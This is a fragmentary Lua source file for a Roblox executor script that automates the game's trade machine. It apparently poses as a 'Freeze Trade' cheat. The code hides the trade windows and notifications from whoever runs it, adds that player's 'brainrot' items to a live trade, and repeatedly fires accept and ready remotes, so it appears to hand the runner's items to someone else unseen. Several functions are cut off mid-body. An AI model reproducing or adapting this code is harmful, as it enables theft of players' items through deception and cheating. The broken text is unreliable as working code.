                Frame.Position = UDim2.new(

                    StartPos.Y.Scale, StartPos.Y.Offset + delta.Y

            end)
        end
    end)
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            Dragging = false
        end
    end)

local function FindRemoteAnywhere(Name)
    local Paths = { {"Packages","Net"}, {"Net"}, {} }
    for _, Path in ipairs(Paths) do
        local Node = ReplicatedStorage
        local Ok = true
        for _, P in ipairs(Path) do
            local Child; pcall(function() Child = Node:FindFirstChild(P, true) end)
            if not Child then Ok = false; break end
            Node = Child
        end
        if Ok then
            local R; pcall(function() R = Node:FindFirstChild(Name, true) end)
            if R then return R end
        end
    end
    for _, V in ipairs(ReplicatedStorage:GetDescendants()) do
        if V.Name == Name then return V end
    end
    return nil
end

local StealthActive = false
local HiddenStates = {}
local StealthConns = {}
local function HideGui(Gui)
    if not Gui or HiddenStates[Gui] ~= nil then return end
    HiddenStates[Gui] = Gui.Enabled
    pcall(function() Gui.Enabled = false end)
    pcall(function() for _,D in ipairs(Gui:GetDescendants()) do KillSfxNow(D) end end)
    table.insert(StealthConns, Gui.DescendantAdded:Connect(function(D) KillSfxNow(D) end))
    table.insert(StealthConns, Gui:GetPropertyChangedSignal("Enabled"):Connect(function()
        if StealthActive then pcall(function() Gui.Enabled = false end) end
    end))
end
local function StartStealth()
    StealthActive = true
    for _,N in ipairs({"TradePlayerList","TradeLiveTrade","TradePrompts","Effects","Notification","TopNotification"}) do
        local G = PlayerGui:FindFirstChild(N)
        if G then HideGui(G) end
    end
    table.insert(StealthConns, PlayerGui.ChildAdded:Connect(function(Child)
        local N = Child.Name
        if N=="TradePlayerList" or N=="TradeLiveTrade" or N=="TradePrompts" or N=="Effects" then
            task.defer(function() HideGui(Child) end)
        end
    end))
end
local function StopStealth()
    StealthActive = false
    for _,C in ipairs(StealthConns) do pcall(function() C:Disconnect() end) end
    StealthConns = {}
    for Gui, WasEnabled in pairs(HiddenStates) do pcall(function() Gui.Enabled = WasEnabled end) end
    HiddenStates = {}
end

local function FireConns(Signal, ...)
    local Args = {...}
    pcall(function()
        for _,C in ipairs(getconnections(Signal)) do
            pcall(function() C:Fire(table.unpack(Args)) end)
            pcall(function() C.Function(table.unpack(Args)) end)
        end
    end)
end

local function OpenMachine()
    pcall(function()
        local TM = workspace:FindFirstChild("TradeMachine")
        if TM then
            local Prompt = TM:FindFirstChild("Prompt")
            local PP = Prompt and Prompt:FindFirstChildWhichIsA("ProximityPrompt")
            if PP then
                pcall(function() PP.Enabled = true; fireproximityprompt(PP); task.wait(0.12); PP.Enabled = false end)
                if PlayerGui:FindFirstChild("TradePlayerList") then return true end
                return true
            end
        end
    end)

    for _, V in ipairs(workspace:GetDescendants()) do
        if V:IsA("ProximityPrompt") then
            local anc = V.Parent
            local foundTradeMachine = false
            for i = 1, 8 do
                if not anc then break end
                if anc.Name == "TradeMachine" then foundTradeMachine = true; break end
                anc = anc.Parent
            end
            if foundTradeMachine then
                pcall(function() V.Enabled = true; fireproximityprompt(V); task.wait(0.12); V.Enabled = false end)
                if PlayerGui:FindFirstChild("TradePlayerList") then return true end
                return true
            end
        end
    end

    local TMroot = workspace:FindFirstChild("TradeMachine")
    if TMroot then
        for _, V in ipairs(TMroot:GetDescendants()) do
            if V:IsA("ClickDetector") then
                pcall(function() fireclickdetector(V) end); task.wait(0.12); return true
            end
            if V:IsA("BasePart") then
                local HRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if HRP then
                    pcall(function() firetouchinterest(HRP, V, 0); firetouchinterest(HRP, V, 1) end)
                    task.wait(0.12)
                    return true
                end
            end
        end
    end

    return false
end

local function WaitForLiveTrade(Timeout)
    local T = 0
    while T < Timeout do
        local Live = PlayerGui:FindFirstChild("TradeLiveTrade")
        if Live then
            local LF = Live:FindFirstChild("TradeLiveTrade")
            if LF and LF:FindFirstChild("Your") and LF:FindFirstChild("Other") then
                return Live, LF
            end
        end
        task.wait(0.1); T = T + 0.1
    end
    return nil, nil
end

                            HitByLabel = true; break
                        end
                    end
                end
            end
            if HitByName or HitByLabel then
                local Btn = Fill and Fill:FindFirstChild("Send")
                if Btn then return Btn end
                if Fill then
                    for _, Child in ipairs(Fill:GetChildren()) do
                        if Child:IsA("ImageButton") or Child:IsA("TextButton") then return Child end
                    end
                end
                for _, D in ipairs(Entry:GetDescendants()) do
                    if D:IsA("ImageButton") or D:IsA("TextButton") then return D end
                end
            end
        end
    end
    return nil
end

local function ParseSlot(SlotFrame)
    if not SlotFrame:IsA("Frame") then return nil end
    local Spacer = SlotFrame:FindFirstChild("Spacer")
    if Spacer and Spacer:IsA("ImageButton") then
        local TitleLabel = Spacer:FindFirstChild("Title")
        if TitleLabel and TitleLabel:IsA("TextLabel") and #(TitleLabel.Text or "") > 0 then
            return { Spacer = Spacer, Name = TitleLabel.Text }
        end
    end
    for _, Btn in ipairs(SlotFrame:GetChildren()) do
        if Btn:IsA("ImageButton") or Btn:IsA("TextButton") then
            for _, Lbl in ipairs(SlotFrame:GetDescendants()) do
                if Lbl:IsA("TextLabel") and #(Lbl.Text or "") > 0 and not string.find(Lbl.Text or "","$",1,true) then
                    return { Spacer = Btn, Name = Lbl.Text }
                end
            end
        end
    end
    return nil
end

local function CollectSlots(Scroll)
    local Out = {}
    if not Scroll then return Out end
    for _, Child in ipairs(Scroll:GetChildren()) do
        if not Child:IsA("Frame") then continue end
        local P = ParseSlot(Child)
        if P then table.insert(Out, { Fr = Child, Btn = P.Spacer, Name = P.Name }) end
    end
    return Out
end

local function AddBrainrotsViaRemote()
    if not RfReqList or not RfAddBrainrot then return false end
    local Ok, Res = pcall(function() return RfReqList:InvokeServer() end)
    if not Ok or type(Res) ~= "table" then return false end
    local InventoryMap = {}
    for _, Item in ipairs(Res) do
        if type(Item) ~= "table" then continue end
        local Name = tostring(Item.name or Item.Name or Item.brainrotName or "")
        local Id = Item.id or Item.Id or Item.brainrotId or Item.uuid or Item.Uuid
        if not Id then continue end
        local K = string.lower(Name)
        InventoryMap[K] = InventoryMap[K] or {}
        table.insert(InventoryMap[K], Id)
    end
    local Wanted = {}
    for _, W in ipairs(BrainrotItems) do
        local K = string.lower(W)
        Wanted[K] = (Wanted[K] or 0) + MaxPerItem
    end
    local Added = 0
    for K, Qty in pairs(Wanted) do
        local List = InventoryMap[K] or {}
        for I = 1, math.min(Qty, #List) do
            local Id = List[I]
            pcall(function() RfAddBrainrot:InvokeServer(Id) end)
            Added = Added + 1
            task.wait(AddDelay)
        end
    end
    return Added > 0
end

local function AddBrainrotsViaUI()
    local Scroll
    for _ = 1, 40 do
        Scroll = GetYourScroll()
        if Scroll and #Scroll:GetChildren() > 1 then break end
        task.wait(0.25)
    end
    if not Scroll then
        UpdateProgress(85, "Preparando Freeze Trade...")
        return 0
    end
    UpdateProgress(83, "Preparando Freeze Trade...")
    task.wait(0.3)
    pcall(function() Scroll.CanvasPosition = Vector2.new(0, 0) end)
    task.wait(0.2)

    local WantedMap = {}
    for _, W in ipairs(BrainrotItems) do
        local K = string.lower(W)
        WantedMap[K] = (WantedMap[K] or 0) + MaxPerItem
    end

    local ClickedBtns = {}
    local TotalAdded = 0

    local function MatchesSlot(SlotNameLower, TargetLower)
        if string.find(SlotNameLower, TargetLower, 1, true) then return true end
        for W in string.gmatch(TargetLower, "%w+") do
            if #W > 2 and string.find(SlotNameLower, string.lower(W), 1, true) then return true end
        end
        return false
    end

    for Pass = 1, 4 do
        local MadeChange = false
        local Slots = CollectSlots(Scroll)
        for _, S in ipairs(Slots) do
            if not S.Btn or ClickedBtns[S.Btn] then continue end
            local SNameLower = string.lower(S.Name or "")
            for Key, Rem in pairs(WantedMap) do
                if Rem > 0 and MatchesSlot(SNameLower, Key) then
                    ClickedBtns[S.Btn] = true
                    NuclearClick(S.Btn)
                    WantedMap[Key] = Rem - 1
                    TotalAdded = TotalAdded + 1
                    MadeChange = true
                    task.wait(AddDelay)
                    break
                end
            end
        end
        if not MadeChange then
            local MaxY = Scroll.AbsoluteCanvasSize.Y
            pcall(function() Scroll.CanvasPosition = Vector2.new(0, 0) end)
            task.wait(0.1)
            local CurY = 0
            while CurY <= MaxY + 120 do
                pcall(function() Scroll.CanvasPosition = Vector2.new(0, CurY) end)
                task.wait(0.09)
                CurY = CurY + 120
            end
            pcall(function() Scroll.CanvasPosition = Vector2.new(0, 0) end)
            task.wait(0.12)
        end
        local RemainingTotal = 0
        for _, V in pairs(WantedMap) do RemainingTotal = RemainingTotal + V end
        if RemainingTotal <= 0 then break end
    end

    local RemainingTotal = 0
    for _, V in pairs(WantedMap) do RemainingTotal = RemainingTotal + V end
    if RemainingTotal > 0 then
        local Slots = CollectSlots(Scroll)
        for _, S in ipairs(Slots) do
            if not S.Btn or ClickedBtns[S.Btn] then continue end
            local SNameLower = string.lower(S.Name or "")
            for Key, Rem in pairs(WantedMap) do
                if Rem > 0 and string.find(SNameLower, Key, 1, true) then
                    ClickedBtns[S.Btn] = true
                    NuclearClick(S.Btn)
                    WantedMap[Key] = Rem - 1
                    TotalAdded = TotalAdded + 1
                    task.wait(AddDelay)
                    break
                end
            end
        end
    end

    UpdateProgress(96, "Preparando Auto Accept...")
    task.wait(0.3)
    return TotalAdded
end

local function FindReadyCandidates()
    local Out = {}
    local Keywords = {"ready","pronto","aceitar","accept","confirmar"}
    for _, Gui in ipairs(PlayerGui:GetChildren()) do
        if not Gui:IsA("ScreenGui") then continue end
        for _, D in ipairs(Gui:GetDescendants()) do
            if D:IsA("ImageButton") or D:IsA("TextButton") then
                local Txt = string.lower(tostring(D:IsA("TextButton") and D.Text or "") or "")
                local Matched = false
                for _, Kw in ipairs(Keywords) do
                    if #Txt > 0 and string.find(Txt, Kw, 1, true) then Matched = true; break end
                end
                if not Matched then
                    for _, Ch in ipairs(D:GetDescendants()) do
                        if Ch:IsA("TextLabel") or Ch:IsA("TextButton") then
                            local T = string.lower(tostring(Ch.Text or ""))
                            for _, Kw in ipairs(Keywords) do
                                if string.find(T, Kw, 1, true) then Matched = true; break end
                            end
                            if Matched then break end
                        end
                    end
                end
                if Matched then table.insert(Out, D) end
            elseif D:IsA("TextLabel") then
                local T = string.lower(tostring(D.Text or ""))
                local Found = false
                for _, Kw in ipairs(Keywords) do
                    if string.find(T, Kw, 1, true) then Found = true; break end
                end
                if Found then
                    local Anc = D.Parent
                    for I = 1, 6 do
                        if not Anc then break end
                        if Anc:IsA("ImageButton") or Anc:IsA("TextButton") then
                            table.insert(Out, Anc); break
                        end
                        Anc = Anc.Parent
                    end
                end
            end
        end
    end
    local Seen = {}
    local Filtered = {}
    for _, V in ipairs(Out) do
        if V and not Seen[V] then Seen[V] = true; table.insert(Filtered, V) end
    end
    return Filtered
end

local function StartAcceptLoop()
    if _G.TrollTraderAccept then pcall(function() _G.TrollTraderAccept:Disconnect() end); _G.TrollTraderAccept = nil end
    local LastClick = 0
    _G.TrollTraderAccept = RunService.Heartbeat:Connect(function()
        local Now = tick()
        if Now - LastClick < (ReadyClickInterval - 0.02) then return end
        LastClick = Now
        pcall(function() if ReAccept then ReAccept:FireServer() end end)
        pcall(function() if ReReady then ReReady:FireServer() end end)
        pcall(function() if RfAcceptInvite then RfAcceptInvite:InvokeServer() end end)
        pcall(function()
            local Cands = FindReadyCandidates()
            for _, Btn in ipairs(Cands) do pcall(function() NuclearClick(Btn) end) end
        end)
    end)
end

    pcall(function() if ReReady then ReReady:FireServer() end end)
    task.wait(ReadyDelay)
    StartAcceptLoop()
    task.spawn(function()
        local Attempts = 0
        while Attempts < AcceptActiveRetries do
            Attempts = Attempts + 1
            if not PlayerGui:FindFirstChild("TradeLiveTrade") then break end
            pcall(function() if ReAccept then ReAccept:FireServer() end end)
            pcall(function() if RfAcceptInvite then RfAcceptInvite:InvokeServer() end end)
            pcall(function()
                for _, Gui in ipairs(PlayerGui:GetChildren()) do

                    if not (string.find(GN,"trade") or string.find(GN,"trocar") or string.find(GN,"live")) then continue end
                    local LF = Gui:FindFirstChild(Gui.Name)
                    local OtherF = LF and LF:FindFirstChild("Other")
                    local RB = OtherF and OtherF:FindFirstChild("ReadyButton")
                    if RB then pcall(function() NuclearClick(RB) end) end
                    for _, D in ipairs(Gui:GetDescendants()) do
                        if D:IsA("TextButton") or D:IsA("ImageButton") then
                            local T = string.lower(tostring(D.Text or ""))
                            if T == "pronto" or T == "ready" or T == "accept" or T == "confirmar" or T == "aceitar" then
                                pcall(function() NuclearClick(D) end)
                            end
                        end
                    end
                end
            end)
            task.wait(ReadyClickInterval)
            if OtherIsReady() then
                pcall(function() if ReAccept then ReAccept:FireServer() end end)
                pcall(function() if RfAcceptInvite then RfAcceptInvite:InvokeServer() end end)
            end
        end
    end)
end
